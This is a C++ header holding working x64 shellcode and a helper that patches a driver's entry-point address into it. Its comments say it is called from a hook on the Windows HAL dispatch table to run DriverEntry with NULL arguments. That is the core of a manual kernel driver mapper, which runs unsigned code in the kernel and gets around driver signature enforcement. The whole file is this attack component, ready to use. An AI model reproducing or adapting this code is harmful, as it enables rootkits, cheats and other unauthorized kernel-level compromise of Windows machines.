#pragma once
#include <cstdint>

//
// Driver Entry Shellcode Wrapper
// Properly calls DriverEntry(DriverObject, RegistryPath) from HAL dispatch table hook
// 
// The HAL dispatch table hook (HalDispatchTable[1]) is called with:
//   NTSTATUS HaliQuerySystemInformation(IN ULONG InfoClass, ...)
// 
// We need shellcode that:
// 1. Saves volatile registers
// 2. Sets up DriverObject = NULL, RegistryPath = NULL
// 3. Calls the real DriverEntry
// 4. Returns STATUS_SUCCESS
//

namespace DriverEntryShellcode {

// Shellcode that calls driver entry with NULL parameters
// Input at runtime: Patch the DriverEntry address at offset ENTRY_ADDR_OFFSET
static uint8_t g_EntryShellcode[] = {
    // Prologue - save all volatile registers (we don't know what caller expects)
    0x55,                                           // push rbp
    0x48, 0x89, 0xE5,                               // mov rbp, rsp
    0x41, 0x57,                                     // push r15
    0x41, 0x56,                                     // push r14
    0x41, 0x55,                                     // push r13
    0x41, 0x54,                                     // push r12
    0x53,                                           // push rbx
    0x57,                                           // push rdi
    0x56,                                           // push rsi
    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 28h (shadow space + alignment)
    
    // Setup parameters for DriverEntry(NULL, NULL)
    0x48, 0x31, 0xC9,                               // xor rcx, rcx (DriverObject = NULL)
    0x48, 0x31, 0xD2,                               // xor rdx, rdx (RegistryPath = NULL)
    
    // Call DriverEntry (address patched at runtime)
    0x48, 0xB8,                                     // mov rax, imm64
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // <DriverEntry address - patched>
    0xFF, 0xD0,                                     // call rax
    
    // Epilogue - restore registers
    0x48, 0x83, 0xC4, 0x28,                         // add rsp, 28h
    0x5E,                                           // pop rsi
    0x5F,                                           // pop rdi
    0x5B,                                           // pop rbx
    0x41, 0x5C,                                     // pop r12
    0x41, 0x5D,                                     // pop r13
    0x41, 0x5E,                                     // pop r14
    0x41, 0x5F,                                     // pop r15
    0x5D,                                           // pop rbp
    
    // Return STATUS_SUCCESS regardless of DriverEntry result
    // (HAL function expects specific return, DriverEntry returns NTSTATUS)
    0x31, 0xC0,                                     // xor eax, eax
    0xC3                                            // ret
};

constexpr size_t SHELLCODE_SIZE = sizeof(g_EntryShellcode);
constexpr size_t ENTRY_ADDR_OFFSET = 27;  // Offset of DriverEntry address (after mov rax,)

// Alternative: Shellcode that creates a work item to call DriverEntry async
// This avoids blocking the HAL call and is safer
static uint8_t g_AsyncEntryShellcode[] = {
    // Just return STATUS_SUCCESS - driver should self-initialize via DPC/timer
    // This is a stub - real async init requires more infrastructure
    0x31, 0xC0,                                     // xor eax, eax
    0xC3                                            // ret
};

// Get a copy of shellcode with driver entry address patched
inline size_t GetPatchedShellcode(uint8_t* outBuffer, void* driverEntry) {
    memcpy(outBuffer, g_EntryShellcode, SHELLCODE_SIZE);
    *(uint64_t*)(outBuffer + ENTRY_ADDR_OFFSET) = (uint64_t)driverEntry;
    return SHELLCODE_SIZE;
}

// Validate that the shellcode offset is correct
inline bool ValidateOffsets() {
    // At ENTRY_ADDR_OFFSET-2, we should have 0x48 0xB8 (mov rax, imm64)
    return (g_EntryShellcode[ENTRY_ADDR_OFFSET - 2] == 0x48 &&
            g_EntryShellcode[ENTRY_ADDR_OFFSET - 1] == 0xB8);
}

} // namespace DriverEntryShellcode
